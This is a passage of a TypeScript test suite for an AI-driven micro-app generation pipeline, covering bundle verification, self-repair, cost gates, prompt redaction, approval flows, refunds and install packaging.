  ['malformed route', 'BAD_ROUTE', manifest((m) => m.routes.push({ method: 'GET' }))],
  ['routes not an array', 'BAD_ROUTES', manifest((m) => (m.routes = 'x'))],
  ['collections not an array', 'BAD_COLLECTIONS', manifest((m) => (m.collections = 'x'))],
  ['missing form action', 'MISSING_FORM_ACTION', manifest((m) => (m.form_actions = []))],
  ['form actions not an array', 'BAD_FORM_ACTIONS', manifest((m) => (m.form_actions = null))],
  ['AI cap above 100', 'BAD_LIMIT', manifest((m) => (m.limits = { monthly_ai_calls_cap: 101 }))],
  ['AI cap of zero', 'BAD_LIMIT', manifest((m) => (m.limits = { monthly_ai_calls_cap: 0 }))],
  ['AI cap fractional', 'BAD_LIMIT', manifest((m) => (m.limits = { monthly_ai_calls_cap: 1.5 }))],
  ['manifest not an object', 'MANIFEST_SHAPE', () => ({ manifest: [], html: REF().html })],
  ['bundle not an object', 'BUNDLE_SHAPE', () => 'nope'],
  ['no html', 'BUNDLE_SHAPE', () => ({ manifest: REF().manifest })],
  ['too large', 'TOO_LARGE', html((h) => h + `<!-- ${'x'.repeat(MAX_HTML_CHARS)} -->`)],
  ['no lang', 'A11Y_LANG', html((h) => h.replace(' lang="en"', ''))],
  ['no title', 'A11Y_TITLE', html((h) => h.replace(/<title>[^<]*<\/title>/, '<title> </title>'))],
  ['no viewport', 'MOBILE_VIEWPORT', html((h) => h.replace(/<meta name="viewport"[^>]*>/, ''))],
  ['no main', 'A11Y_MAIN', html((h) => h.replace(/<\/?main>/g, ''))],
  ['no h1', 'A11Y_H1', html((h) => h.replace(/<\/?h1>/g, ''))],
  ['no photo input', 'MISSING_PHOTO_INPUT', html((h) => h.replace(/<input id="photo"[^>]*>/, ''))],
  ['photo input without accept', 'PHOTO_INPUT_ACCEPT', html((h) => h.replace('accept="image/*" ', ''))],
  ['unlabelled photo input', 'A11Y_LABEL', html((h) => h.replace(' aria-label="Photo of a recipe"', '').replace('<label for="photo">Photo of a recipe</label>', ''))],
  ['no search box', 'MISSING_SEARCH_INPUT', html((h) => h.replace(/<input id="q"[^>]*>/, ''))],
  ['image without alt', 'A11Y_IMG_ALT', inject('<img src="data:image/png;base64,AAAA">')],
  ['empty button', 'A11Y_BUTTON', inject('<button type="button"></button>')],
  ['no suggestions control', 'MISSING_SUGGEST_UI', html((h) => h.replace(/What Should We Cook\?/g, 'Ideas'))],
  ['unwired route', 'UNWIRED_ROUTE', html((h) => h.split('api/suggest').join('api/other'))],
];
for (const [name, code, make] of STRUCTURE) {
  test(`VERIFIER structure: ${name} -> ${code}`, () => {
    const found = codes(make(), SLUG);
    assert.ok(found.includes(code), `${code} expected, got ${found.join(', ') || 'nothing'}`);
    assert.equal(verify(make(), SLUG).ok, false);
  });
}

test('VERIFIER: diagnostics are formatted for the repair model with their code, message and location, and an ok bundle has none', () => {
  const bad = verify(inject('<script>eval("1")</script>')(), SLUG);
  const text = formatDiagnostics(bad.diagnostics);
  assert.match(text, /EVAL/);
  assert.ok(text.split('\n').length >= 1);
  assert.equal(formatDiagnostics([]), '');
});

test('PLAN VERIFIER: a research plan needs a title, a summary, at least three sections with text, and next steps; it cannot characterize tax treatment', () => {
  const ok = { title: 'T', summary: 'S', sections: [{ heading: 'A', body: 'a' }, { heading: 'B', body: 'b' }, { heading: 'C', body: 'c' }], next_steps: ['go'] };
  assert.deepEqual(verifyPlan(ok), { ok: true, diagnostics: [] });
  assert.equal(MIN_PLAN_SECTIONS, 3);
  const bad: Array<[string, unknown]> = [
    ['not an object', 'x'],
    ['no title', { ...ok, title: '' }],
    ['no summary', { ...ok, summary: ' ' }],
    ['two sections', { ...ok, sections: ok.sections.slice(0, 2) }],
    ['empty heading', { ...ok, sections: [{ heading: '', body: 'a' }, ...ok.sections.slice(1)] }],
    ['empty body', { ...ok, sections: [{ heading: 'A', body: '' }, ...ok.sections.slice(1)] }],
    ['no next steps', { ...ok, next_steps: [] }],
    ['an empty next step', { ...ok, next_steps: [''] }],
    ['too long', { ...ok, summary: 'x'.repeat(21_000) }],
  ];
  for (const [name, plan] of bad) assert.equal(verifyPlan(plan).ok, false, name);
});

test('SMOKE TEST: the real runtime serves the reference bundle through every route; a broken bundle fails with diagnostics', async () => {
  const good = await smokeTestBundle(REF(), { household_id: HH, appName: 'TestApp' });
  assert.equal(good.ok, true, JSON.stringify(good.diagnostics));
  assert.ok(good.checks.length >= 5 && good.checks.every((c) => c.status === 200), JSON.stringify(good.checks));
  const broken = REF();
  broken.manifest.routes = broken.manifest.routes.filter((r) => r.handler !== 'search');
  const bad = await smokeTestBundle(broken, { household_id: HH, appName: 'TestApp' });
  assert.equal(bad.ok, false);
  assert.ok(bad.diagnostics.length >= 1);
});

// ═══════════════ the install packager ═══════════════

test('INSTALL PACKAGER: an embed snippet, a Cloudflare Pages patch and a GitHub PR bundle, all data; the token is read-only and scoped to one app', async () => {
  const token = await signAppToken('secret-0123456789abcdef', { household_id: HH, app_id: 'app_abc', scope: 'install' }, 3600, new Date());
  const art = buildInstallArtifact({ base_url: 'https://app.example/', household_id: HH, slug: SLUG, title: 'Jo "Best" <Recipes>', install_token: token, target_domain: 'jos-kitchen.example' });
  assert.equal(art.version, 1);
  assert.equal(art.app_url, `https://app.example/apps/${HH}/${SLUG}`);
  assert.ok(art.embed_snippet.iframe.startsWith(`<iframe src="https://app.example/apps/${HH}/${SLUG}?t=`));
  assert.ok(art.embed_snippet.iframe.includes('title="Jo &quot;Best&quot; &lt;Recipes&gt;"'), 'attributes are escaped');
  assert.ok(art.embed_snippet.web_component.includes('<hosted-app src="https://app.example/apps/'));
  assert.deepEqual(art.cloudflare_pages_patch.dns, { type: 'CNAME', name: 'recipes.jos-kitchen.example', target: 'app.example' });
  assert.equal(art.cloudflare_pages_patch.subdomain, 'recipes.jos-kitchen.example');
  assert.equal(art.cloudflare_pages_patch.redirects_file.path, '_redirects');
  assert.match(art.cloudflare_pages_patch.redirects_file.content, /^\/recipes  https:\/\/app\.example\/apps\/.*\?t=.*  302\n\/recipes\/\*  /);
  assert.equal(art.github_pr_bundle.branch, `add-${SLUG}`);
  assert.equal(art.github_pr_bundle.files[0]!.path, `${SLUG}/index.html`);
  assert.ok(art.github_pr_bundle.files[0]!.content.includes('<iframe src='));
  const t = /\?t=([^"&\s]+)/.exec(art.embed_snippet.iframe)![1]!;
  const claims = await verifyAppToken('secret-0123456789abcdef', decodeURIComponent(t), new Date());
  assert.deepEqual(claims, { household_id: HH, app_id: 'app_abc', scope: 'install' });
  assert.equal(await verifyAppToken('another-secret-0123456789', decodeURIComponent(t), new Date()), null);
  assert.equal(await verifyAppToken('secret-0123456789abcdef', decodeURIComponent(t), new Date(Date.now() + 2 * 3600_000)), null, 'expired');
  assert.equal(await verifyAppToken('secret-0123456789abcdef', decodeURIComponent(t) + 'x', new Date()), null, 'tampered');
  assert.equal(buildInstallArtifact({ base_url: 'https://app.example', household_id: HH, slug: SLUG, title: 'T', install_token: 'x', target_domain: null }).cloudflare_pages_patch.subdomain, `recipes.${DOMAIN_PLACEHOLDER}`);
  for (const [prompt, domain] of [
    ["Build my wife a recipe app for her blog at jos-kitchen.example please", 'jos-kitchen.example'],
    ['put it on https://www.Example-Site.com/blog', 'example-site.com'],
    ['email me at jo@private.example when done', null],
    ['no domain here', null],
  ] as const) assert.equal(domainFromPrompt(prompt), domain, prompt);
  void goalModel;
});

// ═══════════════ goal flows: self-repair, gates, refunds, approval ═══════════════

import { debitCredit } from '../src/billing/credits';
import { stripeClient } from '../src/billing/stripe';
import { putEncrypted } from '../src/crypto/vault';
import { TIMEOUT } from './helpers/m2';
import { GOAL_APPROVAL_TIMEOUT_MS, MAX_REPAIRS, acceptDag, estimateCallUsd, slugOf, type GoalOutcome } from '../src/goals/goalPipeline';
import { decline } from './helpers/m7';

const bad = {
  eval: inject('<script>eval("1")</script>'),
  noSearchRoute: manifest((m) => (m.routes = m.routes.filter((r: any) => r.handler !== 'search'))),
};
const fund = async (h: Household, sub: number, pur = 0): Promise<void> => {
  if (sub > 0) await fx.grant(h, sub);
  if (pur > 0) await rt.db.prepare(`INSERT INTO credit_ledger (entry_id, household_id, delta, sub_delta, pur_delta, reason, stripe_event_id) VALUES (?, ?, ?, 0, ?, 'pack_purchase', ?)`).bind(`led_pur_${randomUUID()}`, h.household_id, pur, pur, `pack:${randomUUID()}`).run();
};
const buckets = (h: Household) => creditBalances(rt.db, h.household_id);
const ledgerOf = (id: string) => fx.all<{ entry_id: string; delta: number; sub_delta: number; pur_delta: number; reason: string }>('SELECT entry_id, delta, sub_delta, pur_delta, reason FROM credit_ledger WHERE run_id = ? ORDER BY rowid', id);
const appsOf = (id: string) => fx.all<{ status: string; bundle_r2_key: string }>('SELECT status, bundle_r2_key FROM micro_apps WHERE goal_id = ?', id);

type RigOpts = NonNullable<Parameters<typeof goalRig>[2]>;
/** One goal through the whole state machine from a direct row (the API has its own tests). */
async function runGoalCase(h: Household, o: { script?: RigOpts['script']; tier?: 'micro_app' | 'research_plan'; prompt?: string; approval?: Parameters<typeof runToEnd>[1]; smoke?: RigOpts['smoke'] } = {}) {
  const rig = goalRig(rt, h, { ...(o.script === undefined ? {} : { script: o.script }), ...(o.smoke === undefined ? {} : { smoke: o.smoke }) });
  await insertGoal(rt, rig, { ...(o.tier === undefined ? {} : { tier: o.tier }), ...(o.prompt === undefined ? {} : { prompt: o.prompt }) });
  const run = await runToEnd(rig, o.approval ?? approve(), rt);
  return { rig, ...run, id: rig.params.goal_id };
}

for (const [name, make, code] of [
  ['a forbidden call (eval)', bad.eval, 'EVAL'],
  ['a missing handler route', bad.noSearchRoute, 'MISSING_ROUTE'],
] as const) {
  test(`SELF-REPAIR (${name}): the verifier's exact diagnostics go back to the worker, the second attempt passes, retries are counted, and the goal still completes`, async () => {
    const h = await makeHousehold(rt.db);
    await fund(h, 5);
    const r = await runGoalCase(h, { script: { bundles: [make, REF] } });
    assert.equal(r.outcome.status, 'completed');
    assert.equal(r.rig.model.count('GOAL-CODE'), 1);
    assert.equal(r.rig.model.count('GOAL-REPAIR'), 1);
    const repair = r.rig.model.sent('GOAL-REPAIR')[0]!;
    assert.ok(repair.includes(code), `the repair prompt carries ${code}`);
    assert.ok(repair.includes('The exact problems found (verify_bundle)'));
    if (code === 'EVAL') assert.ok(repair.includes('eval(&quot;1&quot;)') || repair.includes('eval(\\"1\\")') || repair.includes('eval('), 'and the failing deliverable itself');
    const t = await tasks(r.id);
    assert.deepEqual(t.filter((x) => ['code_gen', 'verify_bundle'].includes(x.kind)).map((x) => [x.kind, x.status, x.retries]), [['code_gen', 'PASSED', 1], ['verify_bundle', 'PASSED', 1]]);
    assert.deepEqual((await goalRow(r.id))['status'], 'COMPLETED');
    assert.equal((await buckets(h)).total, 0, 'the goal was delivered, so the 5 credits stay spent');
  });
}

test('SELF-REPAIR: a failing smoke test is repaired the same way, with its diagnostics', async () => {
  const h = await makeHousehold(rt.db);
  await fund(h, 5);
  let calls = 0;
  const r = await runGoalCase(h, {
    script: { bundles: [REF, REF] },
    smoke: async () => {
      calls += 1;
      return calls === 1 ? { ok: false, diagnostics: [{ code: 'SMOKE_SEARCH_500', message: 'GET /api/search answered 500', where: 'GET /api/search' }], checks: [] } : { ok: true, diagnostics: [], checks: [{ name: 'ui', status: 200 }] };
    },
  });
  assert.equal(r.outcome.status, 'completed');
  assert.equal(calls, 2);
  const repair = r.rig.model.sent('GOAL-REPAIR')[0]!;
  assert.ok(repair.includes('SMOKE_SEARCH_500') && repair.includes('(smoke_test)'));
  assert.deepEqual((await tasks(r.id)).filter((x) => ['code_gen', 'smoke_test'].includes(x.kind)).map((x) => [x.kind, x.status, x.retries]), [['code_gen', 'PASSED', 1], ['smoke_test', 'PASSED', 1]]);
});

test('SELF-REPAIR: a model that answers with something that is not JSON counts as a failed attempt and is repaired', async () => {
  const h = await makeHousehold(rt.db);
  await fund(h, 5);
  const r = await runGoalCase(h, { script: { bundles: [() => 'not a bundle', REF] } });
  assert.equal(r.outcome.status, 'completed');
  assert.ok(r.rig.model.sent('GOAL-REPAIR')[0]!.includes('BUNDLE_SHAPE'));
});

test('REPAIR EXHAUSTED: after 2 repairs the goal FAILS, the full 5 credits go back to the exact buckets, nothing is staged, and the cap held', async () => {
  const h = await makeHousehold(rt.db);
  await fund(h, 2, 3);
  const before = await buckets(h);
  assert.deepEqual(before, { subscription: 2, purchased: 3, total: 5 });
  const r = await runGoalCase(h, { script: { bundles: [bad.eval] } });
  assert.deepEqual(r.outcome, { status: 'failed', code: 'REPAIR_EXHAUSTED' });
  assert.equal(MAX_REPAIRS, 2);
  assert.equal(r.rig.model.count('GOAL-CODE'), 1);
  assert.equal(r.rig.model.count('GOAL-REPAIR'), 2, 'at most 2 repair retries');
  const goal = await goalRow(r.id);
  assert.deepEqual([goal['status'], goal['error_code']], ['FAILED', 'REPAIR_EXHAUSTED']);
  assert.ok(goal['cost_usd'] <= 1.25);
  assert.deepEqual(await buckets(h), before, 'refunded bucket for bucket');
  assert.deepEqual((await ledgerOf(r.id)).map((e) => [e.reason, e.sub_delta, e.pur_delta]), [['mission_debit', -2, -3], ['mission_refund', 2, 3]]);
  assert.deepEqual(await appsOf(r.id), []);
  assert.equal((await rt.bucket.list({ prefix: `apps/${h.household_id}/` })).objects.length, 0, 'no bundle was written to R2');
  const t = await tasks(r.id);
  assert.equal(t.find((x) => x.kind === 'code_gen')!.retries, 2);
  assert.ok(t.every((x) => x.status !== 'PENDING' && x.status !== 'RUNNING'), 'nothing is left running');
  assert.deepEqual(r.steps, ['classify_and_debit', 'plan_dag', 'execute_with_self_repair', 'gate_failure'].filter((s) => s !== 'gate_failure'), 'the failure is returned by the step, not thrown');
  assert.equal(r.waits.length, 0, 'it never asked for approval');
});

test('GATE G8: a goal that overruns its cap is stopped BEFORE the next model call and refunded; micro-app cap $1.25 and research cap $0.75', async () => {
  const h = await makeHousehold(rt.db);
  await fund(h, 2, 3);
  const app = await runGoalCase(h, { script: { usage: { schema: { prompt_tokens: 1000, completion_tokens: 2_600_000 } } } });
  assert.deepEqual(app.outcome, { status: 'failed', code: 'G8_COST' });
  assert.equal(app.rig.model.count('GOAL-CODE'), 0, 'the next model call never happened');
  const g = await goalRow(app.id);
  assert.deepEqual([g['status'], g['error_code'], g['max_cost_usd']], ['FAILED', 'G8_COST', 1.25]);
  assert.ok(g['cost_usd'] > 1.25, 'the call that crossed the line was already paid for; the gate stops the one after');
  assert.deepEqual(await buckets(h), { subscription: 2, purchased: 3, total: 5 });

  const h2 = await makeHousehold(rt.db);
  await fund(h2, 1, 4);
  const research = await runGoalCase(h2, { tier: 'research_plan', prompt: RESEARCH_PROMPT, script: { usage: { plan: { prompt_tokens: 1000, completion_tokens: 80_000 } } } });
  assert.deepEqual(research.outcome, { status: 'failed', code: 'G8_COST' });
  assert.equal(research.rig.model.calls.length, 1, 'only the planner ran');
  assert.deepEqual((await ledgerOf(research.id)).map((e) => [e.reason, e.sub_delta, e.pur_delta]), [['mission_debit', -1, -2], ['mission_refund', 1, 2]]);
  assert.deepEqual(await buckets(h2), { subscription: 1, purchased: 4, total: 5 });
  assert.equal((await goalRow(research.id))['max_cost_usd'], 0.75);
});

test('GATE G8: estimateCallUsd prices the dearer of the primary and failover model, input plus the whole output allowance', () => {
  const env = { CHIEF_MODEL: 'gpt-6.2-sol', WORKER_MODEL: 'gpt-6-luna' } as const;
  assert.ok(Math.abs(estimateCallUsd('chief', env, 10_000, 1_000) - Math.max(10_000 * 2e-6 + 1_000 * 10e-6, 10_000 * 4e-6 + 1_000 * 20e-6)) < 1e-9, 'opus is the dearer failover');
  assert.ok(Math.abs(estimateCallUsd('worker', env, 10_000, 1_000) - (10_000 * 0.1e-6 + 1_000 * 0.5e-6)) < 1e-9);
  assert.ok(estimateCallUsd('worker', env, 20_000, 1_000) > estimateCallUsd('worker', env, 10_000, 1_000));
  assert.ok(estimateCallUsd('worker', env, 10_000, 2_000) > estimateCallUsd('worker', env, 10_000, 1_000));
});

test('TOKEN CLIFF: a request that would send more than 90,000 input tokens never reaches a model, and is refunded', async () => {
  const h = await makeHousehold(rt.db);
  await fund(h, 5);
  const r = await runGoalCase(h, { prompt: `Build a recipe app. ${'tasty soup '.repeat(60_000)}` });
  assert.deepEqual(r.outcome, { status: 'failed', code: 'TOKEN_CLIFF' });
  assert.equal(r.rig.model.calls.length, 0);
  assert.equal((await buckets(h)).total, 5);
});

test('GATE G7: a deliverable that characterizes tax treatment fails the goal at once (no repair) and is refunded', async () => {
  const h = await makeHousehold(rt.db);
  await fund(h, 5);
  const taxy = inject('<p>Every ingredient here is deductible on your return.</p>');
  const r = await runGoalCase(h, { script: { bundles: [taxy, REF] } });
  assert.deepEqual(r.outcome, { status: 'failed', code: 'G7_TAX_LANGUAGE' });
  assert.equal(r.rig.model.count('GOAL-REPAIR'), 0, 'tax language is not repaired');
  assert.equal((await buckets(h)).total, 5);
  assert.equal((await goalRow(r.id))['error_code'], 'G7_TAX_LANGUAGE');
});

test('PROMPT: a request carrying a password is quarantined (no model call, refunded); a card number is masked before any model sees it', async () => {
  const h = await makeHousehold(rt.db);
  await fund(h, 5);
  const q = await runGoalCase(h, { prompt: 'Build me a recipe app. My password: hunter2' });
  assert.deepEqual(q.outcome, { status: 'failed', code: 'PROMPT_QUARANTINED' });
  assert.equal(q.rig.model.calls.length, 0);
  assert.equal((await buckets(h)).total, 5);

  const h2 = await makeHousehold(rt.db);
  await fund(h2, 5);
  const rig = goalRig(rt, h2);
  const res = await api(rig.env, '/api/goals', h2, { body: { prompt_text: 'Build me a recipe app, pay with card 4111 1111 1111 1111' } });
  assert.equal(res.status, 202);
  Object.assign(rig.params, rig.workflows.goal.at(-1)!.params);
  assert.equal((await goalRow(rig.params.goal_id))['prompt_text'], 'Build me a recipe app, pay with card [ACCT ****1111]', 'stored redacted');
  const run = await runToEnd(rig, approve(), rt);
  assert.equal(run.outcome.status, 'completed');
  assert.ok(rig.model.calls.length >= 3 && rig.model.calls.every((c) => !c.sentText.includes('4111')), 'no model call saw the digits');
});

test('TIER MISMATCH: a goals row whose price is not what classifyGoal says is refused before anything is taken', async () => {
  const h = await makeHousehold(rt.db);
  await fund(h, 5);
  const rig = goalRig(rt, h);
  await insertGoal(rt, rig, { tier: 'research_plan', prompt: WIFE_PROMPT });
  const run = await runToEnd(rig, approve(), rt);
  assert.deepEqual(run.outcome, { status: 'failed', code: 'TIER_MISMATCH' });
  assert.equal((await buckets(h)).total, 5, 'nothing was debited');
  assert.equal(rig.model.calls.length, 0);
});

test('APPROVAL: declined, a wrong hash, and a timeout each archive the app, mark the goal DECLINED and refund all 5 credits', async () => {
  const cases: Array<[string, Parameters<typeof runToEnd>[1], GoalOutcome, string]> = [
    ['declined', decline, { status: 'declined', reason: 'declined' }, 'declined'],
    ['wrong hash', () => ({ decision: 'approve', approval_hash: 'f'.repeat(64) }), { status: 'declined', reason: 'approval_hash_mismatch' }, 'approval_hash_mismatch'],
    ['no hash', () => ({ decision: 'approve' }), { status: 'declined', reason: 'approval_hash_mismatch' }, 'approval_hash_mismatch'],
    ['timeout', TIMEOUT, { status: 'declined', reason: 'expired' }, 'expired'],
  ];
  for (const [name, approval, expected, errorCode] of cases) {
    const h = await makeHousehold(rt.db);
    await fund(h, 2, 3);
    const r = await runGoalCase(h, { approval });
    assert.deepEqual(r.outcome, expected, name);
    assert.equal(r.waits[0]!.timeout, GOAL_APPROVAL_TIMEOUT_MS);
    assert.equal(GOAL_APPROVAL_TIMEOUT_MS, 7 * 86_400_000);
    const g = await goalRow(r.id);
    assert.deepEqual([g['status'], g['error_code'], g['prod_url']], ['DECLINED', errorCode, null], name);
    assert.deepEqual((await appsOf(r.id)).map((a) => a.status), ['ARCHIVED'], name);
    assert.deepEqual(await buckets(h), { subscription: 2, purchased: 3, total: 5 }, `${name}: refunded to the exact buckets`);
    assert.equal(await count(`SELECT 1 FROM facts WHERE household_id = ? AND predicate = 'hosted_micro_app'`, h.household_id), 0, `${name}: nothing was published`);
    assert.equal((await api(r.rig.env, appPath(h, '/preview'), h, { fetch: r.rig.deps.fetch })).status, 404, `${name}: an archived app is gone for everyone`);
  }
});

test('PUBLISH REGATE: a bundle changed or removed in R2 after the member previewed it is never published; the goal fails and is refunded', async () => {
  for (const mode of ['tampered', 'deleted'] as const) {
    const h = await makeHousehold(rt.db);
    await fund(h, 5);
    const rig = goalRig(rt, h);
    await insertGoal(rt, rig);
    const run = await runToEnd(
      rig,
      async () => {
        const row = await fx.one<{ approval_hash: string; bundle_r2_key: string }>(`SELECT g.approval_hash, a.bundle_r2_key FROM goals g JOIN micro_apps a ON a.goal_id = g.goal_id WHERE g.goal_id = ?`, rig.params.goal_id);
        if (mode === 'tampered') await putEncrypted(rig.env, h.household_id, row.bundle_r2_key, new TextEncoder().encode(JSON.stringify({ manifest: REF().manifest, html: REF().html + '<!-- changed -->' })));
        else await rt.bucket.delete(row.bundle_r2_key);
        return { decision: 'approve', approval_hash: row.approval_hash };
      },
      rt,
    );
    assert.deepEqual(run.outcome, { status: 'failed', code: 'REGATE_FAILED' }, mode);
    assert.deepEqual([(await goalRow(rig.params.goal_id))['status'], (await goalRow(rig.params.goal_id))['prod_url']], ['FAILED', null], mode);
    assert.deepEqual((await appsOf(rig.params.goal_id)).map((a) => a.status), ['ARCHIVED'], mode);
    assert.equal((await buckets(h)).total, 5, `${mode}: refunded`);
    assert.equal(await count(`SELECT 1 FROM facts WHERE household_id = ? AND predicate = 'hosted_micro_app'`, h.household_id), 0, mode);
  }
});

test('REPLAY: running a finished goal again does nothing (no second debit, no model call), and a debit a crashed step already took is not taken twice', async () => {
  const h = await makeHousehold(rt.db);
  await fund(h, 5);
  const first = await runGoalCase(h);
  assert.equal(first.outcome.status, 'completed');
  const calls = first.rig.model.calls.length;
  const again = await runToEnd(first.rig, approve(), rt);
  assert.deepEqual(again.outcome, first.outcome, 'the same outcome, with its prod_url');
  assert.equal(first.rig.model.calls.length, calls);
  assert.equal((await ledgerOf(first.id)).length, 1);

  const h2 = await makeHousehold(rt.db);
  await fund(h2, 5);
  const rig = goalRig(rt, h2);
  await insertGoal(rt, rig);
  const at = new Date().toISOString();
  await rt.db.prepare(`INSERT INTO mission_runs (run_id, household_id, template_key, template_version, origin, params_json, state, credit_cost, created_at, updated_at) VALUES (?, ?, 'goal_micro_app', 1, 'user', '{"goal":true}', 'CANCELED', 5, ?, ?)`).bind(rig.params.goal_id, h2.household_id, at, at).run();
  assert.equal((await debitCredit(rt.db, h2.household_id, rig.params.goal_id, 5, at)).ok, true);
  const run = await runToEnd(rig, approve(), rt);
  assert.equal(run.outcome.status, 'completed');
  assert.deepEqual((await ledgerOf(rig.params.goal_id)).map((e) => e.delta), [-5], 'one debit');
  assert.equal((await buckets(h2)).total, 0);
});

test('AUTO-RECHARGE: a goal short of credits from a household that opted in recharges once, then runs; without opt-in it halts', async () => {
  const net = newNetwork();
  const h = await makeHousehold(rt.db);
  await rt.db.prepare(`UPDATE households SET stripe_customer_id = 'cus_auto', stripe_default_payment_method_id = 'pm_saved', auto_recharge_enabled = 1, auto_recharge_pack_sku = 'pack_10', auto_recharge_monthly_cap_cents = 2000 WHERE household_id = ?`).bind(h.household_id).run();
  const rig = goalRig(rt, h);
  rig.deps.stripe = stripeClient({ apiKey: 'sk_test', fetch: createGuardedFetch({ db: rt.db, fetchImpl: net.fetch, ttlMs: 0 }) });
  await insertGoal(rt, rig);
  const run = await runToEnd(rig, approve(), rt);
  assert.equal(run.outcome.status, 'completed');
  assert.equal(net.stripe.calls.filter((c) => c.path.includes('payment_intents')).length, 1);
  assert.equal((await buckets(h)).purchased, 5, 'a pack of 10 less the 5-credit goal');

  const h2 = await makeHousehold(rt.db);
  const halted = await runGoalCase(h2);
  assert.deepEqual(halted.outcome, { status: 'insufficient_credits', auto_recharge: 'disabled' });
  assert.deepEqual(halted.steps, ['classify_and_debit']);
});

test('INSUFFICIENT_CREDITS: the goal halts with nothing taken; after a top-up the retry restarts it as <goal_id>~1, once, and it is never charged or run twice', async () => {
  const h = await makeHousehold(rt.db);
  await fund(h, 2);
  const rig = goalRig(rt, h);
  await createViaApi(rig, h, WIFE_PROMPT);
  const id = rig.params.goal_id;
  const first = await runToEnd(rig, approve(), rt);
  assert.deepEqual(first.outcome, { status: 'insufficient_credits', auto_recharge: 'disabled' });
  assert.deepEqual(first.steps, ['classify_and_debit']);
  assert.equal(rig.model.calls.length, 0);
  assert.deepEqual([(await goalRow(id))['status'], (await goalRow(id))['error_code']], ['INSUFFICIENT_CREDITS', 'INSUFFICIENT_CREDITS']);
  assert.deepEqual(await ledgerOf(id), [], 'nothing was taken, so nothing is refunded');
  assert.equal((await buckets(h)).total, 2);

  const short = await api(rig.env, `/api/goals/${id}/retry`, h, { body: {} });
  assert.equal(short.status, 402);
  assert.deepEqual(await asJson(short), { error: 'insufficient_credits', message: 'You are out of credits.', balance: 2, needed: 5, top_up: '/api/credits/checkout' });
  assert.equal(rig.workflows.goal.length, 1, 'no Workflow was started');

  await fund(h, 3);
  const retry = await api(rig.env, `/api/goals/${id}/retry`, h, { body: {} });
  assert.equal(retry.status, 202);
  assert.deepEqual(await asJson(retry), { status: 'accepted', goal_id: id, instance_id: `${id}~1` });
  assert.deepEqual(rig.workflows.goal.map((w) => [w.id, w.params.attempt]), [[id, 0], [`${id}~1`, 1]]);
  assert.equal(rig.workflows.goal[1]!.params.base_url, APP_ORIGIN);
  const second = await api(rig.env, `/api/goals/${id}/retry`, h, { body: {} });
  assert.equal(second.status, 200);
  assert.equal((await asJson(second))['status'], 'already_started');
  assert.equal(rig.workflows.goal.length, 2, 'a second tap starts nothing');
  assert.deepEqual([(await goalRow(id))['status'], (await goalRow(id))['attempt']], ['PLANNING', 1]);

  const rig2 = goalRig(rt, h, { goal_id: id, attempt: 1 });
  Object.assign(rig2.params, rig.workflows.goal[1]!.params);
  const seenRetry: Record<string, unknown> = {};
  const done = await runToEnd(rig2, async () => {
    seenRetry['eventsBefore'] = rig.workflows.goalEvents.length;
    const row = await goalRow(id);
    seenRetry['errorCode'] = row['error_code'];
    const ok = await api(rig.env, `/api/goals/${id}/approve`, h, { body: { approval_hash: row['approval_hash'] } });
    seenRetry['approve'] = ok.status;
    seenRetry['instance'] = rig.workflows.goalEvents.at(-1)?.id;
    return rig.workflows.goalEvents.at(-1)!.payload;
  }, rt);
  assert.deepEqual(seenRetry, { eventsBefore: 0, errorCode: null, approve: 202, instance: `${id}~1` }, 'the halt is cleared before the run, and the approval goes to the newest instance');
  assert.equal(done.outcome.status, 'completed');
  assert.deepEqual((await ledgerOf(id)).map((e) => e.delta), [-5], 'charged once');
  assert.equal(rig2.model.count('GOAL-PLANNER'), 1);
  assert.equal(await count('SELECT 1 FROM micro_apps WHERE goal_id = ?', id), 1);
  assert.equal((await buckets(h)).total, 0);
  assert.equal((await goalRow(id))['error_code'], null, 'the halt is cleared once the goal runs');
});

test('PLAN DAG: only the exact DAG for the tier is accepted from the chief model; anything else runs the canonical DAG', () => {
  const full = ['context_gather', 'schema_gen', 'code_gen', 'verify_bundle', 'smoke_test', 'package_install'].map((kind) => ({ kind, notes: `n ${kind}` }));
  assert.equal(acceptDag('micro_app', full).source, 'chief');
  assert.equal(acceptDag('micro_app', [{ kind: 'decompose', notes: '' }, ...full]).source, 'chief', 'a leading decompose is dropped');
  assert.deepEqual(acceptDag('micro_app', full).tasks.map((t) => t.notes), full.map((t) => t.notes));
  for (const proposed of [full.slice(0, 5), [...full].reverse(), [...full.slice(0, 5), { kind: 'deploy_to_prod', notes: '' }], 'x', null, [{ kind: 'context_gather' }, ...full.slice(1)].slice(0, 5)]) {
    const out = acceptDag('micro_app', proposed);
    assert.equal(out.source, 'canonical');
    assert.deepEqual(out.tasks.map((t) => t.kind), full.map((t) => t.kind));
  }
  assert.deepEqual(acceptDag('research_plan', full).tasks.map((t) => t.kind), ['context_gather', 'schema_gen', 'code_gen', 'verify_bundle']);
  assert.equal(acceptDag('research_plan', full.slice(0, 4)).source, 'chief');
  assert.equal(slugOf('Jo\u2019s Recipe Book!'), 'jo-s-recipe-book');
  assert.equal(slugOf('!!'), 'household-app');
  assert.equal(slugOf('x'.repeat(80)).length, 40);
});

// ═══════════════ the hosted runtime ═══════════════

import { getDecrypted } from '../src/crypto/vault';
import { goalModel as makeGoalModel } from './helpers/m7';
import { fakeProvider } from './helpers/m2';
import { sealCookie } from '../src/workers/session';

interface Live {
  h: Household;
  rig: GoalRig;
  goal_id: string;
  app_id: string;
}
/** A household whose recipe app went all the way to LIVE through the pipeline. */
async function liveApp(): Promise<Live> {
  const h = await makeHousehold(rt.db);
  await fund(h, 5);
  const r = await runGoalCase(h);
  assert.equal(r.outcome.status, 'completed');
  const app = await fx.one<{ app_id: string }>('SELECT app_id FROM micro_apps WHERE goal_id = ?', r.id);
  return { h, rig: r.rig, goal_id: r.id, app_id: app.app_id };
}
const fetchWith = (model: ReturnType<typeof makeGoalModel>): typeof fetch => createGuardedFetch({ db: rt.db, fetchImpl: fakeProvider(model.handler).fetch, ttlMs: 0 });

interface Call {
  path: string;
  method?: string;
  body?: unknown;
  raw?: string;
  bearer?: Household | null;
  token?: string;
  fetch?: typeof fetch;
  headers?: Record<string, string>;
}
async function hit(live: Live, c: Call): Promise<Response> {
  const url = `${APP_ORIGIN}${c.path}${c.token === undefined ? '' : `${c.path.includes('?') ? '&' : '?'}t=${encodeURIComponent(c.token)}`}`;
  const headers: Record<string, string> = { 'content-type': 'application/json', ...(c.headers ?? {}) };
  if (c.bearer !== null && c.bearer !== undefined) headers['authorization'] = `Bearer ${await bearer(live.rig.env, c.bearer)}`;
